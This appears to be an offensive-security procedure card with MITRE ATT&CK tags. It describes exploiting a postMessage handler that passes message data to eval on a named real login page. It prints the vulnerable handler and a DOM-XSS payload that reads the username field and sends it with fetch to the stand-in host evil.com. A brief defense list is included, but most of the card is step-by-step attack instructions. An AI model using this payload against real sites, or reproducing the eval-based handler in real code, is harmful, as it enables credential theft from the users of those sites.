---
tags:
  - xss
  - javascript-execution
  - credential-theft
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:56:19.900Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: bd4dc342-3467-4880-8eba-2b9a49bd5251
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Execute-Arbitrary-JavaScript-on-Target

## Summary

This procedure exploits the target's vulnerable postMessage handler to execute arbitrary JavaScript via eval, demonstrating DOM-based XSS that can lead to credential theft on the login page.

## Description

Upon receiving the postMessage, the handler checks the origin (bypassed) and runs eval(e.data['exec']), injecting code into the login page's context. This allows reading form fields, sending data to attacker servers, or other manipulations.

## Requirements

1. Successful postMessage delivery from previous procedure.
2. Target page loaded with login form elements.
3. Attacker server for exfiltration if needed.

## Defense

Defensive measures and detection strategies:

- Remove or sandbox eval usage in event handlers.
- Validate message structure and sanitize data before execution.
- Implement XSS auditors or WAF rules for JS injection patterns.

## Objectives

1. Run JS in the target's DOM context.
2. Access sensitive elements like login forms.
3. Exfiltrate data or perform actions as the user.

## Instructions

### Step 1: Understand Vulnerable Handler

**Context**: Review the target's JS for the eval point.

```javascript
// Example vulnerable code
window.addEventListener('message', function(e) {
    if (~e.origin.indexOf('https://hq.upserve.com')) {
        eval(e.data['exec']);
    }
});
```

> Expected: Identify the execution trigger.

### Step 2: Inject and Execute Payload

**Context**: Use a payload that alerts or logs for proof; extend to theft.

```javascript
// Payload in postMessage
{exec: "var user = document.getElementById('username').value; fetch('https://evil.com/steal?data=' + user); alert('XSS Executed');
"}
```

> Expected: Alert on target; data sent if fetch included.

### Step 3: Validate Execution

**Context**: Check for JS running in target context.

Observe alert or network requests from target page.

> Expected: Visible effects like popup or exfiltrated data on attacker server.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- dom-xss
- eval-injection
